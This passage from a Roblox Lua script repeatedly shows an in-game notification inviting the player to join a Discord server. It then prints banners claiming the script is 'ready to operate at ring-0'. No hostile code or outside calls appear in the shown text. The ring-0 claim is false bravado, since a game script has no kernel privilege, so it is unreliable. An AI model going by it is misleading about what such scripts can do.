            task.delay(0.5, function() game:GetService("StarterGui"):SetCore("SendNotification", { Title = ":("; Text = "Maybe next time..."; Duration = 5; }) end)
        end
    end
    local function sendInvite()
        return pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", { Title = "E5alR9 - DISCORD", Text = "Join for more useful?", Duration = 99999, Button1 = "YES", Button2 = "NO", Callback = bindable }) end)
    end
    task.wait(5)
    local sent = false
    repeat sent = sendInvite() if not sent then task.wait(2) end until sent == true
end)

task.wait(6)
print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ ALL SYSTEMS LOADED | @E5ALR9 ////////////////////")
print("//// [SYSTEM] READY TO OPERATE AT RING-0 ////")
